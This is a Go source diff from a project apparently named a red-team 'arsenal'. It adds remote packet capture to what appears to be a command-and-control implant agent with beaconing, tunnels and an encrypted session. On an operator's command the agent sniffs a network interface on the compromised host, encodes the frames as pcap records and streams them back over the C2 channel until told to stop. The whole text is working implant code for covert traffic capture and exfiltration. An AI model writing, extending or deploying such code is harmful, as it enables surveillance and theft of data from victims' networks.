@@ -8,6 +8,7 @@ import (
 	"bytes"
 	"context"
 	"crypto/tls"
+	"encoding/binary"
 	"encoding/base64"
 	"encoding/json"
 	"flag"
@@ -24,6 +25,7 @@ import (
 	"time"
 
 	"github.com/sk666G/red-sky---arsenal/internal/agentfw"
+	"github.com/sk666G/red-sky---arsenal/internal/capturer"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
@@ -199,6 +201,18 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			closeTunnel(&t)
+		case proto.TypeCaptureStart:
+			var cs proto.CaptureStart
+			if err := json.Unmarshal(env.Payload, &cs); err != nil {
+				continue
+			}
+			go runCapture(conn, sess, cs)
+		case proto.TypeCaptureStop:
+			var cs proto.CaptureStop
+			if err := json.Unmarshal(env.Payload, &cs); err != nil {
+				continue
+			}
+			stopCapture(cs.SessionID)
 		case proto.TypeSleep:
 			var s proto.Sleep
 			_ = json.Unmarshal(env.Payload, &s)
@@ -385,4 +399,85 @@ func sendTunnelAck(conn net.Conn, sess *crypto.Session, t proto.MessageType, pay
 	sendMu.Lock()
 	defer sendMu.Unlock()
 	_ = sendEncrypted(conn, sess, t, payload)
+}
+
+
+// --- capture ---
+
+var (
+	activeCaptures   = map[string]context.CancelFunc{}
+	activeCapturesMu sync.Mutex
+)
+
+func runCapture(conn net.Conn, sess *crypto.Session, cs proto.CaptureStart) {
+	ctx, cancel := context.WithCancel(context.Background())
+	activeCapturesMu.Lock()
+	activeCaptures[cs.SessionID] = cancel
+	activeCapturesMu.Unlock()
+	defer func() {
+		activeCapturesMu.Lock()
+		delete(activeCaptures, cs.SessionID)
+		activeCapturesMu.Unlock()
+		cancel()
+	}()
+
+	// chunky encode: serialize frames into pcap record format on the fly and
+	// ship them in 64KB data messages.
+	var chunk []byte
+	var chunkCount int
+	const chunkMax = 60 * 1024
+
+	flushChunk := func() {
+		if len(chunk) == 0 {
+			return
+		}
+		sendTunnelAck(conn, sess, proto.TypeCaptureData, proto.CaptureData{
+			SessionID: cs.SessionID,
+			Data:      chunk,
+			Count:     chunkCount,
+		})
+		chunk = nil
+		chunkCount = 0
+	}
+
+	// no per-frame pcap global header here — the core writes that on its side
+	timeout := 30 * time.Second
+	err := capturer.Capture(ctx, capturer.Options{
+		Iface:   cs.Iface,
+		Snaplen: cs.Snaplen,
+		Timeout: timeout,
+	}, func(f capturer.Frame) {
+		// encode one record: 16-byte header + payload
+		var rh [16]byte
+		binary.LittleEndian.PutUint32(rh[0:4], uint32(f.TS.Unix()))
+		binary.LittleEndian.PutUint32(rh[4:8], uint32(f.TS.Nanosecond()/1000))
+		binary.LittleEndian.PutUint32(rh[8:12], uint32(len(f.Data)))
+		binary.LittleEndian.PutUint32(rh[12:16], uint32(f.OrigLen))
+		chunk = append(chunk, rh[:]...)
+		chunk = append(chunk, f.Data...)
+		chunkCount++
+		if len(chunk) >= chunkMax {
+			flushChunk()
+		}
+	})
+	flushChunk()
+
+	if err != nil {
+		sendTunnelAck(conn, sess, proto.TypeCaptureFail, proto.CaptureFail{
+			SessionID: cs.SessionID, Error: err.Error(),
+		})
+		return
+	}
+	sendTunnelAck(conn, sess, proto.TypeCaptureDone, proto.CaptureDone{
+		SessionID: cs.SessionID,
+	})
+}
+
+func stopCapture(sessionID string) {
+	activeCapturesMu.Lock()
+	cancel, ok := activeCaptures[sessionID]
+	activeCapturesMu.Unlock()
+	if ok && cancel != nil {
+		cancel()
+	}
 }
